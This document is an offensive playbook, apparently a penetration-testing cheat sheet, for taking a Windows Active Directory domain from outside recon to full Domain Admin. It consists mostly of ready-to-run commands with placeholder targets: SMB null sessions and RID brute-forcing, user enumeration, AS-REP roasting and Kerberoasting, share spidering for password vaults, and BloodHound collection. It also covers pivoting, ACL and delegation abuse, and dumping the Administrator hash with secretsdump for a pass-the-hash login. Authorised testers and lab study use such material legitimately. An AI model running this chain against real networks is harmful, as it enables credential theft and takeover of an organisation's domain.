## Part 1 Playbook: Perimeter Foothold → Internal AD Escalation → Domain Admin

### Step 1: Unauthenticated Recon, User List & Initial Domain Credential

```bash
# Map open ports, domain FQDN, and DC hostname
nmap -sC -sV -p 53,80,88,135,139,389,443,445,636,3268,3389,5985 TARGET_IP -oA nmap/ad-part1

# Null / guest checks & RID cycling if permitted
nxc smb TARGET_IP -u '' -p '' --shares
nxc smb TARGET_IP -u 'guest' -p '' --rid-brute
kerbrute userenum -d DOMAIN_FQDN --dc DC_IP usernames.txt
impacket-GetNPUsers DOMAIN_FQDN/ -dc-ip DC_IP -usersfile usernames.txt -no-pass -format hashcat -outputfile asrep.hash
```

### Step 2: Authenticated Domain Enumeration & BloodHound Collection

```bash
# Check password policy BEFORE any password spraying
nxc smb DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --pass-pol --users --groups --shares

# Spider readable SMB shares for scripts, KeePass/PasswordSafe vaults, XMLs, and backups
nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD' -M spider_plus

# Collect BloodHound CE graph (add --dns-tcp when running over a tunnel)
bloodhound-ce-python -d DOMAIN_FQDN -u USER -p 'PASSWORD' -ns DC_IP -c All --zip --dns-tcp
```

### Step 3: Roasting, Outbound ACL Chain & Lateral Movement

```bash
# Kerberoast SPN accounts & check encryption type ($krb5tgs$23$ -> -m 13100, $18$ -> -m 19700)
impacket-GetUserSPNs 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile part1-kerb.hash

# Fast CLI check for writable AD objects from your current user
bloodyAD --host DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
```

## Part 2 Playbook: Foothold Host → Multi-Hop Pivot & AD Privilege Escalation

### Step 1: Entry Host Situational Awareness & Credential Harvesting

```powershell
# Windows entry foothold: check privileges, groups, interfaces, listeners, and logged-on users
whoami /all
ipconfig /all
route print
netstat -ano
qwinsta
cmdkey /list
```

- Sweep web roots (`C:\inetpub\wwwroot\`, `/var/www/`), PowerShell `ConsoleHost_history.txt`, scheduled tasks, service accounts, and registry autologon keys.
- Establish a [Ligolo-ng](/pivoting/ligolo) tunnel into the internal AD subnet and add the internal DC + server FQDNs to `/etc/hosts`.

### Step 2: Internal AD Collection & Privilege Escalation Triage

```powershell
# From a domain-joined Windows shell when Kali cannot reach every host directly:
.\SharpHound.exe -c All --zipfilename ad-part2.zip
```

1. **Mark every compromised principal as Owned** in BloodHound CE and run:
   - `MATCH p=shortestPath((u:Tag_Owned)-[*1..]->(t:Tag_Tier_Zero)) RETURN p`
2. **Check ACLs, Delegation, GPOs & Trusts:**
   - Outbound `GenericAll` / `GenericWrite` / `WriteDACL` / `ForceChangePassword` / `AddMember` / `ReadGMSAPassword` / `ReadLAPSPassword` ([ACL Abuse](/active-directory/acl-abuse)).
   - Constrained (`AllowedToDelegate`) or Resource-Based Constrained Delegation (`AllowedToAct` / machine account quota `ms-DS-MachineAccountQuota`) ([Kerberos Delegation](/active-directory/delegation)).
   - Admin sessions (`HasSession` / `AdminTo`) on jump hosts or member servers where LSASS / DPAPI / token impersonation yields a Tier-0 account.
3. **Final Domain Compromise Proof:**

```bash
impacket-secretsdump 'DOMAIN_FQDN/USER:PASSWORD@DC_IP' -just-dc-user Administrator
evil-winrm -i DC_IP -u Administrator -H NT_HASH
```
